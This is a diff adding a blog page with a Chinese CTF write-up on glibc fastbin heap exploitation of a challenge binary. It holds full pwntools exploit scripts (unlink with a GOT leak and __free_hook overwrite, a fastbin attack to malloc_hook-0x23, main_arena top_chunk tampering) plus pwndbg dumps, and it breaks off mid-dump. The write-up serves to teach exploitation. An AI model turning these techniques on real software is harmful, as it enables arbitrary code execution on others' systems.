@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Some strange questions | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="本文首发先知 本人在做堆题时经常遇到一些特别怪的套路,自己不看 exp 基本永远想不到,看完后先是一脸蒙,经过调试就恍然大悟.奥~~ 还能这么玩,所以通过这个系列记录一下 在 fastbin 中,大多数时候修改成可利用的 fd 很考验堆的构造能力,下边就以该题作为模板,因为这题实在有点合适 漏洞简要分析123456789101112131415unsigned __int64 take_note(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Some strange questions">
+<meta property="og:url" content="http://example.com/2019/11/11/2019-11-11-strange_1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="本文首发先知 本人在做堆题时经常遇到一些特别怪的套路,自己不看 exp 基本永远想不到,看完后先是一脸蒙,经过调试就恍然大悟.奥~~ 还能这么玩,所以通过这个系列记录一下 在 fastbin 中,大多数时候修改成可利用的 fd 很考验堆的构造能力,下边就以该题作为模板,因为这题实在有点合适 漏洞简要分析123456789101112131415unsigned __int64 take_note(">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-11-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-11-11-strange_1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/11/2019-11-11-strange_1/" class="article-date">
+  <time class="dt-published" datetime="2019-11-10T16:00:00.000Z" itemprop="datePublished">2019-11-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Some strange questions
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7989">先知</a></p>
+<p>本人在做堆题时经常遇到一些特别怪的套路,自己不看 exp 基本永远想不到,看完后先是一脸蒙,经过调试就恍然大悟.奥~~ 还能这么玩,所以通过这个系列记录一下</p>
+<p>在 fastbin 中,大多数时候修改成可利用的 fd 很考验堆的构造能力,下边就以<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3383#toc-4">该题</a>作为模板,因为这题实在有点合适</p>
+<h2 id="漏洞简要分析"><a href="#漏洞简要分析" class="headerlink" title="漏洞简要分析"></a>漏洞简要分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 take_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;which one do you want modify :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( buf[v1] != 0LL &amp;&amp; v1 &gt;= 0 &amp;&amp; v1 &lt;= 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;please input the content&quot;);</span><br><span class="line">    read(0, buf[v1], 0x100uLL);		//溢出</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显,直接能输入 0x100 字节,堆溢出. checksec 一下,一看没开 pie </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; checksec supwn5 </span><br><span class="line">[*] &#x27;/home/pic/\xe6\xa1\x8c\xe9\x9d\xa2/11\xe6\x9c\x88\xe6\x96\x87\xe7\xab\xa0/supwn5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>我习惯直接 unlink 了,实在有点好用, unlink 的 exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">payload = p64(0)+p64(0x81)+p64(0x06020C0-24)+p64(0x06020C0-16)</span><br><span class="line">payload = payload.ljust(0x80)</span><br><span class="line">payload+=p64(0x80)+p64(0x90)</span><br><span class="line">edit(0,payload)</span><br><span class="line">free(1)</span><br><span class="line">pay = p64(0)*3+p64(elf.got[&#x27;puts&#x27;])+p64(0x06020C0-24)*5</span><br><span class="line">edit(0,pay)</span><br><span class="line">p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">p.sendlineafter(&#x27;which node do you want to show\n&#x27;,&#x27;0&#x27;)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = p64(0)*3+p64(free_hook)+p64(0x06020C0-24)*5</span><br><span class="line">edit(1,pay)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line">edit(0,p64(one))</span><br><span class="line">free(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>常规思路 unlink 到 bss 端直接指那打哪,但是能溢出这么多字节就利用个 off-by-one 觉得有点可惜,就想用点别的思路来做</p>
+<h2 id="fd-到-malloc-hook-0x23"><a href="#fd-到-malloc-hook-0x23" class="headerlink" title="fd 到 malloc_hook-0x23"></a>fd 到 malloc_hook-0x23</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while(i&lt;10):</span><br><span class="line">	p=process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">	new(0x80)</span><br><span class="line">	new(1)</span><br><span class="line">	free(0)</span><br><span class="line">	new(0x80)</span><br><span class="line">	show(0)</span><br><span class="line">	p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">	leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">	base = leak-3951480</span><br><span class="line">	print hex(base)</span><br><span class="line">	i=i+1</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>
+
+<p>通过上述的小脚本跑一下该程序,会发现 so 的基地址在最高字节均为<code>0x7f</code>,这也就是修改 <code>malloc_hook</code> 为 fd 的基础</p>
+<p>提前说明,本篇脚本均完成到了 malloc 到了 malloc_hook ,填入 one_gadget 过程实在有点玄学,各种环境难免保证一样,各位可以自己向下研究利用.上 exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">base = leak-3951480</span><br><span class="line">print hex(base)</span><br><span class="line">new(0x60)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x71)+p64(base+3951341))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">new(0x60)</span><br><span class="line">new(0x60)</span><br><span class="line">edit(3,&#x27;a&#x27;*0x13+&#x27;b&#x27;*8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>基本被玩坏了,靠的就是刚才说的在 malloc_hook-0x23 的 0x7f 固定,必然满足 fastbin 检查,直接就 malloc 出来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x19770b0 —▸ 0x7f8c9946daed (_IO_wide_data_0+301) ◂— 0x8c9912ee20000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/32gx 0x7f8c9946daed</span><br><span class="line">0x7f8c9946daed &lt;_IO_wide_data_0+301&gt;:	0x8c9946c260000000	0x000000000000007f</span><br><span class="line">0x7f8c9946dafd:	0x8c9912ee20000000	0x8c9912ea0000007f</span><br><span class="line">0x7f8c9946db0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f8c9946db1d:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>但是其实还有很多时候无法使用该方法,比如说题目在 malloc 堆的时候是固定字节或者限制 malloc 字节大小,最大是 0x60 这种,就不能这么玩了</p>
+<h2 id="通过-main-arena-修改-top-chunk"><a href="#通过-main-arena-修改-top-chunk" class="headerlink" title="通过 main_arena 修改 top_chunk"></a>通过 main_arena 修改 top_chunk</h2><p>这个并不是直接在 top_chunk 修改值(类似 <code>house of force</code>),而是通过 main_arena 这个放各种结构的地方来修改,详细记录一下思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br></pre></td></tr></table></figure>
+
+<p>上述为框架函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak-3951480</span><br><span class="line"></span><br><span class="line">//效果如下(下方的格式都是先是代码和执行完的调试结果)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0xde8000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 145, </span><br><span class="line">  fd = 0x7f06f2f30b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7f06f2f30b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0xde8090 FASTBIN &#123;</span><br><span class="line">  prev_size = 144, </span><br><span class="line">  size = 33, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x20f51</span><br><span class="line">&#125;</span><br><span class="line">0xde80b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134993, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/32gx 0xde8000</span><br><span class="line">0xde8000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0xde8010:	0x00007f06f2f30b78	0x00007f06f2f30b78</span><br><span class="line">0xde8020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上述为泄漏 libc 地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">new(0x40)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x51)+p64(0x61))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/32gx 0xde8000</span><br><span class="line">0xde8000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0xde8010:	0x00007f06f2f30b78	0x00007f06f2f30b78</span><br><span class="line">0xde8020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde8090:	0x0000000000000090	0x0000000000000021</span><br><span class="line">0xde80a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80b0:	0x0000000000000000	0x0000000000000051</span><br><span class="line">0xde80c0:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0xde80d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xde80f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0xde80b0 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<p>上述为为了之后的 malloc 出来 fastbin 做铺垫,等会作用很大</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">new(0x40)</span><br><span class="line">new(0x50)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x61</span><br><span class="line">0x60: 0xde8100 —▸ 0x7f06f2f30b38 (main_arena+24) ◂— 0xde8100</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/32gx 0x7f06f2f30b38</span><br><span class="line">0x7f06f2f30b38 &lt;main_arena+24&gt;:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x7f06f2f30b48 &lt;main_arena+40&gt;:	0x0000000000de8100	0x0000000000000000</span><br><span class="line">0x7f06f2f30b58 &lt;main_arena+56&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b68 &lt;main_arena+72&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b78 &lt;main_arena+88&gt;:	0x0000000000de8160	0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>可以看到上边的结果, 0x61 已经写进去了,而且 0x60 的块也构造好了,满足构造条件,下边就是合理使用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">new(0x50)</span><br><span class="line">new(0x50)</span><br><span class="line">edit(4,p64(0)*6+p64(leak-0x78))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x7f06f2f30b00</span><br><span class="line">0x7f06f2f30b00 &lt;__memalign_hook&gt;:	0x00007f06f2bf1e20	0x00007f06f2bf1a00</span><br><span class="line">0x7f06f2f30b10 &lt;__malloc_hook&gt;:	0x0000000000000000	